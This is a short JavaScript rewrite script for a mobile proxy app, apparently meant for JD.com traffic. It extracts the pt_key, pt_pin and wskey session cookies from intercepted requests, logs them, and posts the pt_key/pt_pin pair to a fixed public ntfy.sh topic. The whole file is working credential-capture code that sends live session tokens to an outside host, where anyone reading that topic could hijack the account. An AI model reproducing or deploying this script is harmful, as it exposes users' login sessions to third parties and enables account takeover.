const c = $request.headers['Cookie'] || $request.headers['cookie'] || '';

let pin = '', key = '', ws = '';
const pi = c.indexOf('pt_pin=');
const ki = c.indexOf('pt_key=');
const wi = c.indexOf('wskey=');
if (pi >= 0) pin = c.substring(pi + 7).split(';')[0];
if (ki >= 0) key = c.substring(ki + 7).split(';')[0];
if (wi >= 0) ws = c.substring(wi + 6).split(';')[0];

if (pin && key) {
  const full = 'pt_key=' + key + ';pt_pin=' + pin + ';';
  console.log('[JD] ' + full);

  // 推送到 ntfy（安全检查，不可用则跳过）
  if (typeof $httpClient !== 'undefined') {
    $httpClient.post({
      url: 'https://ntfy.sh/HzjHy2codes',
      headers: { 'Title': 'JD_' + pin, 'Priority': 'high' },
      body: full
    }, function(err, resp, data) {
      if (!err) console.log('[JD] ntfy推送成功'); else console.log('[JD] ntfy推送失败');
    });
  } else {
    console.log('[JD] $httpClient不可用，仅日志');
  }
}
if (ws) {
  console.log('[JD] wskey=' + ws + ';' + (pin ? 'pin=' + pin : ''));
}
$done({});
